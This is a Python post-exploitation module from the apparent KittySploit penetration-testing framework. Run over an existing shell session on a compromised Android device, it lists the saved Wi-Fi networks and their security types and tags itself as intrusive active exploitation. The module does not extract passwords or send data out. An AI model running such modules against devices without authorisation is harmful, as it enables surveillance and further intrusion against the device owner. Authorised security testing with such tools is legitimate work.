#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""List saved Wi-Fi networks on a compromised Android device."""

from __future__ import annotations

from kittysploit import *
from lib.protocols.adb.wifi import AdbWifi


class Module(Post):
    __info__ = {
        "name": "Android WiFi Saved Networks",
        "description": "List saved Wi-Fi networks and security types from an Android session",
        "author": "KittySploit Team",
        "session_type": SessionType.ANDROID,
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation'],
        'expected_requests': 2,
        'reversible': False,
        'approval_required': True,
        'produces': ['endpoints', 'tech_hints', 'risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    include_hidden = OptBool(True, "Include hidden or unnamed entries when found", required=False)

    def run(self):
        try:
            print_status("Enumerating saved Wi-Fi networks...")
            print_info("=" * 80)

            wifi = AdbWifi(cmd_execute=self._cmd)
            networks, source = wifi.collect_saved_networks()
            if not networks:
                print_warning("No saved Wi-Fi networks found (or insufficient permissions)")
                print_info("Try on a rooted device or with a shell granted WIFI settings access")
                return False

            print_success(f"Source: {source}")
            open_count = 0
            for index, entry in enumerate(networks, start=1):
                ssid = entry.ssid or "<hidden>"
                if not bool(self.include_hidden) and ssid == "<hidden>":
                    continue
                security = entry.security or "unknown"
                if wifi.classify_security(security) == "open":
                    open_count += 1
                    level = print_warning
                else:
                    level = print_info
                id_text = f" [id {entry.network_id}]" if entry.network_id else ""
                level(f"  {index:02d}. {ssid}{id_text} — {security}")

            print_info("-" * 80)
            print_success(
                f"Found {len(networks)} saved network(s)"
                + (f", {open_count} open/insecure" if open_count else "")
            )
            return True
        except Exception as exc:
            print_error(f"Error: {exc}")
            return False

    def _cmd(self, command: str) -> str:
        return (self.cmd_execute(command) or "").strip()
